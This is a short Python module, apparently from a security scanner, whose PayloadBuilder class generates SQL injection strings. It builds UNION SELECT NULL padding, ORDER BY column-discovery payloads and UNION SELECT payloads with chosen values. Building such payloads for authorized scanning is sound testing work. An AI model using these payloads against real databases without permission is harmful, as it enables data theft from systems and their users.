# app/modules/scanner/common/payload_builder.py

"""
Payload builder for SQL injection.
"""


class PayloadBuilder:
    """SQL injection payload builder."""

    def __init__(self):
        """Initialize payload builder."""
        self.generic_payloads = {
            "union_select_null": "UNION SELECT NULL",
            "union_select_nulls": "UNION SELECT {nulls}",
            "order_by": "ORDER BY {column}",
        }

    def build_union_payload(self, columns: int, from_clause: str = "") -> str:
        """
        Build a UNION SELECT payload.

        Args:
            columns: Number of columns
            from_clause: FROM clause (e.g., "FROM dual")

        Returns:
            str: UNION payload
        """
        nulls = ",".join(["NULL"] * columns)
        payload = f"UNION SELECT {nulls}"
        if from_clause:
            payload += f" {from_clause}"
        return payload

    def build_order_by_payload(self, column: int) -> str:
        """
        Build an ORDER BY payload for column discovery.

        Args:
            column: Column number

        Returns:
            str: ORDER BY payload
        """
        return f"ORDER BY {column}"

    def build_union_with_values(
        self, columns: int, values: list[str], from_clause: str = ""
    ) -> str:
        """
        Build a UNION SELECT payload with specific values.

        Args:
            columns: Number of columns
            values: Values to select
            from_clause: FROM clause

        Returns:
            str: UNION payload with values
        """
        if len(values) > columns:
            values = values[:columns]
        elif len(values) < columns:
            values.extend(["NULL"] * (columns - len(values)))

        select_list = ",".join(values)
        payload = f"UNION SELECT {select_list}"
        if from_clause:
            payload += f" {from_clause}"
        return payload
